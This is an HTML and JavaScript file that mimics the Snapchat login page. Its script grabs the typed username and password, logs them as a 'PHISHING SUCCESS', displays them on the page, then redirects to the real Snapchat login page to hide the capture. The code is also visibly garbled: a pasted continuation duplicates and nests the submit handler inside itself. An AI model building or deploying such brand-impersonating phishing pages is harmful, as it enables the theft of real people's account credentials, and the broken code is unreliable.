<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <!-- Crucial Meta Tag for proper mobile rendering -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>👻 Log In to Snapchat</title>
    <style>
        /* --- GLOBAL STYLES & LAYOUT --- */
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background-color: #f5f7fa; /* Very light gray/off-white background, common in iOS apps */
        }

        .login-container {
            width: 100%;
            max-width: 400px; /* Standard phone width constraint */
            text-align: center;
            padding: 30px 20px;
            background: #ffffff;
            border-radius: 20px; /* More pronounced rounding for iOS feel */
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1); /* Deeper shadow */
        }

        /* Snapchat Logo Styling */
        .snapchat-logo {
            font-size: 60px; /* Big ghost icon! */
            margin-bottom: 15px;
            display: block;
        }

        h1 {
            color: #3A017C; /* Deep Purple text */
            margin-top: 0;
            font-size: 2em;
            font-weight: 700; /* Bolder font weight for title */
        }
        
        /* --- INPUT FIELD STYLING (Modern iOS Look) --- */
        input[type="text"], input[type="password"] {
            width: calc(100% - 32px); 
            padding: 15px 12px; 
            margin-bottom: 18px; /* More spacing between inputs */
            background-color: #f9f9f9; 
            border: 1px solid #ccc;
            border-radius: 30px; /* Pill shape for iOS style */
            font-size: 1em;
            transition: border-color 0.2s ease, box-shadow 0.2s ease;
            box-sizing: border-box; 
        }

        input[type="text"]:focus, input[type="password"]:focus {
            border-color: #4A90E2; /* Blue focus ring */
            box-shadow: 0 0 0 3px rgba(74, 144, 226, 0.3); /* Soft blue glow on focus */
            outline: none;
        }

        /* --- BUTTON STYLING (The Action Button) --- */
        button {
            width: 100%;
            padding: 15px; 
            background-color: #FFFC00; /* Bright Yellow button */
            border: none;
            border-radius: 30px;
            font-size: 1.1em;
            font-weight: bold;
            color: #3A017C; /* Purple text on yellow background */
            cursor: pointer;
            transition: background-color 0.2s ease, transform 0.1s ease;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15); /* Button shadow */
        }

        button:hover {
            background-color: #ffe833; /* Slightly lighter yellow on hover */
            transform: translateY(-2px); /* Little lift effect */
        }
        
        /* --- RESULTS AREA (The Secret Message - Now Visible by Default) --- */
        #results {
            margin-top: 40px; 
            padding: 30px; /* Slightly increased padding for visual weight */
            border-radius: 18px; /* Even softer corners */
            background-color: #e6f7ff; /* Very light, airy blue background */
            border: 2px dashed #4A90E2; /* A clear, friendly border */
            display: none; /* Start hidden, JS will show it */
        }

        #results h2 {
            color: #3A017C;
            margin-top: 0;
            font-size: 1.8em; 
            border-bottom: 2px solid #4A90E2;
            padding-bottom: 10px;
        }

        #results p {
            margin: 15px 0; /* Increased vertical spacing */
            line-height: 1.5;
            font-size: 1em;
        }
        
        #results strong {
            color: #3A017C; /* Make the labels bold and purple */
            display: inline-block; 
            width: 130px; /* Adjusted width for better alignment */
        }

    </style>
</head>
<body>
    <div class="login-container">
        <!-- Snapchat Logo -->
        <div class="snapchat-logo">👻</div>
        <h1>Snapchat</h1>
        
        <!-- THE FORM: Action is set to "" so it submits back to THIS page -->
        <form id="snapLoginForm" action="" method="POST"> 
            
            <input type="text" name="username" placeholder="Username or Email" required>
            <input type="password" name="password" placeholder="Password" required>
            
            <!-- This button triggers the JavaScript event listener -->
            <button type="submit">Log In</button>
        </form>
        
        <!-- THE CAPTURE RESULTS AREA (Hidden until submission) -->
        <div id="results">
            <h2>✅ Credentials Captured!</h2>
            <p><strong style="font-size: 1.1em;">📱 Username/Email:</strong> <span id="displayUsername" style="font-weight: 600; color: #3A017C;"></span></p>
            <p><strong style="font-size: 1.1em;">🔒 Password:</strong> <span id="displayPassword" style="font-weight: 600; color: #3A017C;"></span></p>
        </div>
    </div>

    <!-- JAVASCRIPT: The Brain -->
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            
            const resultsDiv = document.getElementById('results');
            const loginForm = document.getElementById('snapLoginForm');
            const displayUsernameSpan = document.getElementById('displayUsername');
            const displayPasswordSpan = document.getElementById('displayPassword');

            // Listen for when the form is submitted
            loginForm.addEventListener('submit', function(event) {
                
                // 1. STOP THE DEFAULT ACTION (Prevents immediate page reload/redirect)
                event.preventDefault(); 
                
                // 2. Grab the values typed into the inputs
                const username = document.querySelector('input[name="username"]').value;
                const password = document.querySelector('input[name="password"]').value;
                
                // 3. LOG THE DATA (This should now appear in your browser Console)
                console.log("==============================================");
                console.log("*** 🕵️‍♂️ PHISHING SUCCESS: CREDENTIALS CAPTURED! ***");
                console.log("Username:", username);
                console.log("Password:", password);
                console.log("==============================================");

                // 4. UPDATE THE HTML TO SHOW THE DATA INSTANTLY
                displayUsernameSpan.textContent = username;
                displayPasswordSpan.textContent = password;
                resultsDiv.style.display = 'block'; // Make the results box visible
                
                // Optional: Scroll to the results box if on a very long page
                resultsDiv.scrollIntoView({ behavior: 'smooth' });
// ... (All previous code remains exactly the same up until this point)

            loginForm.addEventListener('submit', function(event) {
                
                // 1. STOP THE DEFAULT ACTION (Prevents immediate page reload/redirect)
                event.preventDefault(); 
                
                // 2. Grab the values typed into the inputs
                const username = document.querySelector('input[name="username"]').value;
                const password = document.querySelector('input[name="password"]').value;
                
                // 3. LOG THE DATA (This should now appear in your browser Console)
                console.log("==============================================");
                console.log("*** 🕵️‍♂️ PHISHING SUCCESS: CREDENTIALS CAPTURED! ***");
                console.log("Username:", username);
                console.log("Password:", password);
                console.log("==============================================");

                // 4. UPDATE THE HTML TO SHOW THE DATA INSTANTLY
                displayUsernameSpan.textContent = username;
                displayPasswordSpan.textContent = password;
                resultsDiv.style.display = 'block'; // Make the results box visible
                
                // Optional: Scroll to the results box if on a very long page
                resultsDiv.scrollIntoView({ behavior: 'smooth' });

                // ---------------------------------------------------------
                // 🌟 CONTINUATION STARTS HERE: THE REDIRECT LOGIC
                // ---------------------------------------------------------
                
                // Wait for 2 seconds (2000 milliseconds) before redirecting
                const delayInMilliseconds = 2000; 

                setTimeout(() => {
                    console.log(`\n--- Redirecting to real Snapchat in ${delayInMilliseconds / 1000} seconds... ---`);
                    
                    // The destination URL (This is the REAL Snapchat login page)
                    const snapchatURL = "https://accounts.snapchat.com/login"; 
                    
                    // Perform the redirection!
                    window.location.href = snapchatURL;

                }, delayInMilliseconds); // Pass the delay time to setTimeout
            });
        }); // End of DOMContentLoaded listener
    </script>
</body>
</html>
